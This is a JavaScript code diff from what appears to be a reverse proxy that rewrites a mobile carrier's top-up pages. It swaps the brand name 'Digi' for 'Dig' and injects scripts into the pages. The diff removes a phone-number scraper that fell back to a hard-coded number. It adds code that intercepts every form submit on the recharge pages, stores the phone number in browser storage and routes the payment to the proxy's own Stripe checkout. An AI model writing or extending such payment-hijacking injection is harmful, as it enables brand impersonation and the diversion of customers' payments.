@@ -55,7 +55,7 @@ function replaceDigiWithDig(text) {
     if (match === 'DIGI') return 'DIG';
     if (match === 'Digi') return 'Dig';
     if (match === 'digi') return 'dig';
-    return match; 
+    return match;
   });
 
   for (let i = protectedElements.length - 1; i >= 0; i--) {
@@ -160,284 +160,121 @@ async function modifyHTML(response) {
         console.log('No amount radio found, using default 5');
         return '5';
       }
-      
-      // Отримати номер телефону з різних джерел на сторінці
-      function getPhoneNumberFromPage() {
-        // Спочатку перевіряємо номер телефону зі сховища
-        let phoneNumber = '';
-        try {
-          phoneNumber = window.phoneNumberForPayment || 
-                       sessionStorage.getItem('rechargePhoneNumber') || 
-                       localStorage.getItem('rechargePhoneNumber') || '';
-        } catch (e) { }
-        
-        if (phoneNumber && phoneNumber.match(/\\d{9}/)) {
-          console.log('Found phone number in storage:', phoneNumber);
-          return phoneNumber;
-        }
-        
-        // Перевіряємо поля введення
-        const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
-        if (phoneInput && phoneInput.value) {
-          phoneNumber = phoneInput.value.replace(/\\D/g, '');
-          console.log('Found phone number in input field:', phoneNumber);
-          if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
-        }
-        
-        // Перевіряємо div з класом phone і span всередині нього
-        const phoneSpan = document.querySelector('.phone span');
-        if (phoneSpan && phoneSpan.textContent) {
-          phoneNumber = phoneSpan.textContent.trim().replace(/\\D/g, '');
-          console.log('Found phone number in .phone span:', phoneNumber);
-          if (phoneNumber.match(/\\d{9}/)) {
-            // Зберігаємо номер в сховищі для подальшого використання
-            try {
-              sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
-              localStorage.setItem('rechargePhoneNumber', phoneNumber);
-              window.phoneNumberForPayment = phoneNumber;
-            } catch (e) { }
-            return phoneNumber;
-          }
-        }
-        
-        // Перевіряємо будь-який span, який містить 9-значний номер
-        const spans = document.querySelectorAll('span');
-        for (const span of spans) {
-          const text = span.textContent.trim();
-          const digits = text.replace(/\\D/g, '');
-          if (digits.match(/^\\d{9}$/)) {
-            console.log('Found phone number in span:', digits);
-            // Зберігаємо номер в сховищі для подальшого використання
-            try {
-              sessionStorage.setItem('rechargePhoneNumber', digits);
-              localStorage.setItem('rechargePhoneNumber', digits);
-              window.phoneNumberForPayment = digits;
-            } catch (e) { }
-            return digits;
-          }
-        }
-        
-        // Перевіряємо текст у будь-якому div з класом "phone"
-        const phoneDivs = document.querySelectorAll('.phone');
-        for (const div of phoneDivs) {
-          const text = div.textContent.trim();
-          const matches = text.match(/\\d{9}/);
-          if (matches) {
-            console.log('Found phone number in .phone div:', matches[0]);
-            // Зберігаємо номер в сховищі для подальшого використання
-            try {
-              sessionStorage.setItem('rechargePhoneNumber', matches[0]);
-              localStorage.setItem('rechargePhoneNumber', matches[0]);
-              window.phoneNumberForPayment = matches[0];
-            } catch (e) { }
-            return matches[0];
-          }
-        }
-        
-        // Шукаємо 9-значний номер у будь-якому тексті на сторінці
-        const bodyText = document.body.textContent;
-        const matches = bodyText.match(/\\b(\\d{9})\\b/g);
-        if (matches && matches.length > 0) {
-          console.log('Found phone number in body text:', matches[0]);
-          // Зберігаємо номер в сховищі для подальшого використання
-          try {
-            sessionStorage.setItem('rechargePhoneNumber', matches[0]);
-            localStorage.setItem('rechargePhoneNumber', matches[0]);
-            window.phoneNumberForPayment = matches[0];
-          } catch (e) { }
-          return matches[0];
-        }
-        
-        console.log('No valid phone number found on page, using default number');
-        // Використовуємо валідний номер за замовчуванням
-        return '624041199'; // Валідний номер телефону
-      }
-      
-      // Функція прямого перенаправлення на платіж (гарантоване)
-      async function directPaymentRedirect(amount, phoneNumber) {
-        console.log('Starting payment redirect...');
-        
-        try {
-          // Отримуємо номер телефону зі сторінки, якщо він не переданий
-          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
-            phoneNumber = getPhoneNumberFromPage();
-            console.log('Got phone for payment:', phoneNumber);
-          }
-          
-          // Отримуємо суму, якщо вона не передана
-          if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
-            amount = getSelectedAmountFromRadios();
-            console.log('Got amount for payment:', amount);
-          }
-          
-          console.log('Processing direct payment with amount:', amount, 'phone:', phoneNumber);
-          
-          // Запит до API створення платежу
-          const response = await fetch('/api/create-payment', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-              amount: amount, 
-              phoneNumber: phoneNumber,
-              successUrl: window.location.origin + '/payment-success',
-              cancelUrl: window.location.origin + '/payment-cancel'
-            })
-          });
-          
-          console.log('Payment request response status:', response.status);
-          
-          if (!response.ok) {
-            console.error('Payment request failed with status:', response.status);
-            throw new Error('Payment request failed with status: ' + response.status);
-          }
-          
-          const data = await response.json();
-          console.log('Payment API response:', data);
-          
-          if (data.url) {
-            console.log('Redirecting to Stripe URL:', data.url);
-            window.location.href = data.url;
-            return true;
-          } else if (data.sessionId) {
-            console.log('Using Stripe checkout with session ID:', data.sessionId);
-            const stripe = await window.stripeLoadedPromise;
-            if (!stripe) throw new Error('Stripe failed to load');
-            const result = await stripe.redirectToCheckout({ sessionId: data.sessionId });
-            if (result.error) {
-              throw new Error(result.error.message);
-            }
-            return true;
-          } else {
-            throw new Error('No URL or sessionId in response');
-          }
-        } catch (error) {
-          console.error('Payment error:', error);
-          alert('Payment error: ' + error.message);
-          return false;
-        }
-      }
 
       window.processPayment = async function(amount, phoneNumber, sourceEvent) {
-        if (sourceEvent) {
-          sourceEvent.preventDefault();
-          sourceEvent.stopPropagation();
-        }
-        
+  if (sourceEvent) {
+    sourceEvent.preventDefault();
+    sourceEvent.stopPropagation();
+  }
+  
+  try {
+    const isFirstStep = window.location.pathname.includes('/recargar') && 
+                       !document.querySelector('[data-amount], .recharge-amount');
+    
+    if (isFirstStep) {
+      const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
+      if (phoneInput && phoneInput.value) {
         try {
-          const isFirstStep = window.location.pathname.includes('/recargar') && 
-                             !document.querySelector('[data-amount], .recharge-amount');
-          
-          if (isFirstStep) {
-            const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
-            if (phoneInput && phoneInput.value.match(/\\d{9}/)) {
-              try {
-                sessionStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
-                localStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
-                window.phoneNumberForPayment = phoneInput.value.replace(/\\D/g, '');
-              } catch (e) { console.error('Error storing phone:', e); }
-            }
-            return true;
-          }
-          
-          // Отримати номер телефону з різних джерел на сторінці
-          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
-            phoneNumber = getPhoneNumberFromPage();
-          }
-          
-          if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
-            amount = getSelectedAmountFromRadios() || '5';
-          }
-          
-          console.log('Processing payment with amount:', amount, 'phone:', phoneNumber);
-          
-          // Використовуємо directPaymentRedirect для гарантованого перенаправлення
-          return await directPaymentRedirect(amount, phoneNumber);
-        } catch (error) {
-          console.error('Payment error:', error);
-          alert('Payment error: ' + error.message);
-          return false;
-        }
-      };
+          const cleanedPhone = phoneInput.value.replace(/\D/g, '');
+          // Store the phone number regardless of format for later use
+          sessionStorage.setItem('rechargePhoneNumber', cleanedPhone);
+          localStorage.setItem('rechargePhoneNumber', cleanedPhone);
+          window.phoneNumberForPayment = cleanedPhone;
+          console.log('Stored phone number:', cleanedPhone);
+        } catch (e) { console.error('Error storing phone:', e); }
+      }
+      return true;
+    }
+    
+    if (!phoneNumber) {
+      try {
+        phoneNumber = window.phoneNumberForPayment || 
+                     sessionStorage.getItem('rechargePhoneNumber') || 
+                     localStorage.getItem('rechargePhoneNumber') || '';
+      } catch (e) { console.error('Error retrieving phone:', e); }
       
-      // Глобальна змінна для відстеження стану оплати
-      window.paymentInProgress = false;
+      if (!phoneNumber) {
+        const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
+        phoneNumber = phoneInput?.value.replace(/\D/g, '') || '';
+      }
+    }
+    
+    // Clean any non-digit characters
+    phoneNumber = phoneNumber.replace(/\D/g, '');
+    
+    if (!phoneNumber) {
+      alert('Error: Phone number required');
+      return false;
+    }
+
+    console.log('Using phone number for payment:', phoneNumber);
+    
+    if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
+      amount = getSelectedAmountFromRadios() || '5';
+    }
+    
+    console.log('Processing payment with amount:', amount, 'phone:', phoneNumber);
+    
+    const response = await fetch('/api/create-payment', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        amount: amount, 
+        phoneNumber: phoneNumber,
+        successUrl: window.location.origin + '/payment-success',
+        cancelUrl: window.location.origin + '/payment-cancel'
+      })
+    });
+    
+    if (!response.ok) throw new Error('Payment request failed');
+    const data = await response.json();
+    
+    if (data.url) {
+      window.location.href = data.url;
+    } else if (data.sessionId) {
+      const stripe = await window.stripeLoadedPromise;
+      if (!stripe) throw new Error('Stripe failed to load');
+      await stripe.redirectToCheckout({ sessionId: data.sessionId });
+    }
+    return false;
+  } catch (error) {
+    alert('Payment error: ' + error.message);
+    return false;
+  }
+};
       
       document.addEventListener('DOMContentLoaded', function() {
-        console.log('DOM loaded, scanning for phone number...');
-        
-        // Пошук номера телефону на сторінці при завантаженні
-        const phoneNumber = getPhoneNumberFromPage();
-        if (phoneNumber) {
-          console.log('Phone number found and saved:', phoneNumber);
-        }
-        
-        // Автоматичний перехід до наступного етапу
+        // Автоматичний перехід до наступного етапу, якщо поточний URL містить "check_number"
         if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
           autoProgressAfterCheckNumber();
         }
         
-        // Перехоплення всіх кліків для обробки кнопок оплати
-        document.addEventListener('click', function(event) {
-          if (window.paymentInProgress) return;
-          
-          const target = event.target;
-          if (target.tagName === 'BUTTON' || target.tagName === 'A' || 
-              target.tagName === 'INPUT' || target.classList.contains('btn')) {
-            
-            const buttonText = (target.textContent || '').toLowerCase();
-            if (buttonText.includes('pagar') || buttonText.includes('recargar') || 
-                buttonText.includes('confirmar') || buttonText.includes('continuar') ||
-                target.classList.contains('btn-primary') || target.classList.contains('btn-success')) {
-              
-              // Якщо ми на сторінці з вибором суми
-              if (document.querySelector('input[name="recharge_number[amount]"]')) {
-                console.log('Payment button clicked:', buttonText);
-                
-                event.preventDefault();
-                event.stopPropagation();
-                
-                if (!window.paymentInProgress) {
-                  window.paymentInProgress = true;
-                  
-                  const amount = getSelectedAmountFromRadios();
-                  const phoneNumber = getPhoneNumberFromPage();
-                  
-                  directPaymentRedirect(amount, phoneNumber).finally(() => {
-                    window.paymentInProgress = false;
-                  });
-                }
-                
-                return false;
-              }
-            }
-          }
-        }, true);
-        
         // Перехоплюємо всі форми
         document.querySelectorAll('form').forEach(form => {
+          console.log('Form found:', form.id || form.name || 'unnamed form');
+          
           form.addEventListener('submit', function(event) {
+            console.log('Form submit intercepted:', form.id || form.name);
+            
             // Перевіряємо, чи це форма з вибором суми
             const hasAmountRadios = form.querySelector('input[name="recharge_number[amount]"]');
             if (hasAmountRadios) {
-              console.log('Intercepted form submit with amount selection');
+              console.log('Form has amount radios');
+              const selectedAmount = getSelectedAmountFromRadios();
+              console.log('Selected amount:', selectedAmount);
+            
+              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
+              const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
+              console.log('Phone from form:', phoneNumber);
               
-              event.preventDefault();
-              event.stopPropagation();
-              
-              if (!window.paymentInProgress) {
-                window.paymentInProgress = true;
-                
-                const selectedAmount = getSelectedAmountFromRadios();
-                const phoneNumber = getPhoneNumberFromPage();
-                
-                console.log('Form submit with amount:', selectedAmount, 'phone:', phoneNumber);
-                
-                directPaymentRedirect(selectedAmount, phoneNumber).finally(() => {
-                  window.paymentInProgress = false;
-                });
-              }
-              
+              window.processPayment(selectedAmount, phoneNumber, event);
               return false;
+            } else {
+              // Для інших форм
+              const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
+              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
+              const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
+              window.processPayment(amount, phoneNumber, event);
             }
           });
         });
@@ -562,76 +399,6 @@ async function modifyJavaScript(response) {
       return '5';
     }
     
-    // Функція для пошуку номера телефону на сторінці
-    function getPhoneNumberFromPage() {
-      // Спочатку перевіряємо номер телефону зі сховища
-      let phoneNumber = '';
-      try {
-        phoneNumber = window.phoneNumberForPayment || 
-                     sessionStorage.getItem('rechargePhoneNumber') || 
-                     localStorage.getItem('rechargePhoneNumber') || '';
-      } catch (e) { }
-      
-      if (phoneNumber && phoneNumber.match(/\\d{9}/)) {
-        console.log('Found phone number in storage:', phoneNumber);
-        return phoneNumber;
-      }
-      
-      // Перевіряємо поля введення
-      const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
-      if (phoneInput && phoneInput.value) {
-        phoneNumber = phoneInput.value.replace(/\\D/g, '');
-        if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
-      }
-      
-      // Перевіряємо div з класом phone і span всередині нього
-      const phoneSpan = document.querySelector('.phone span');
-      if (phoneSpan && phoneSpan.textContent) {
-        phoneNumber = phoneSpan.textContent.trim().replace(/\\D/g, '');
-        if (phoneNumber.match(/\\d{9}/)) {
-          // Зберігаємо номер для подальшого використання
-          try {
-            sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
-            localStorage.setItem('rechargePhoneNumber', phoneNumber);
-            window.phoneNumberForPayment = phoneNumber;
-          } catch (e) { }
-          return phoneNumber;
-        }
-      }
-      
-      // Перевіряємо текст у будь-якому div з класом "phone"
-      const phoneDivs = document.querySelectorAll('.phone');
-      for (const div of phoneDivs) {
-        const text = div.textContent.trim();
-        const matches = text.match(/\\d{9}/);
-        if (matches) {
-          // Зберігаємо номер
-          try {
-            sessionStorage.setItem('rechargePhoneNumber', matches[0]);
-            localStorage.setItem('rechargePhoneNumber', matches[0]);
-            window.phoneNumberForPayment = matches[0];
-          } catch (e) { }
-          return matches[0];
-        }
-      }
-      
-      // Шукаємо 9-значний номер у будь-якому тексті на сторінці
-      const bodyText = document.body.textContent;
-      const matches = bodyText.match(/\\b(\\d{9})\\b/g);
-      if (matches && matches.length > 0) {
-        // Зберігаємо номер
-        try {
-          sessionStorage.setItem('rechargePhoneNumber', matches[0]);
-          localStorage.setItem('rechargePhoneNumber', matches[0]);
-          window.phoneNumberForPayment = matches[0];
-        } catch (e) { }
-        return matches[0];
-      }
-      
-      // Використовуємо валідний номер за замовчуванням
-      return '624041199'; // Валідний номер телефону
-    }
-    
     // Автоматичний перехід до наступного кроку після перевірки номера
     (function() {
       if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
@@ -649,14 +416,6 @@ async function modifyJavaScript(response) {
           }
         }, 500);
       }
-      
-      // Після завантаження документа, шукаємо номер телефону
-      document.addEventListener('DOMContentLoaded', function() {
-        const phoneNumber = getPhoneNumberFromPage();
-        if (phoneNumber) {
-          console.log('Found phone number on page:', phoneNumber);
-        }
-      });
     })();
     
     (function() {
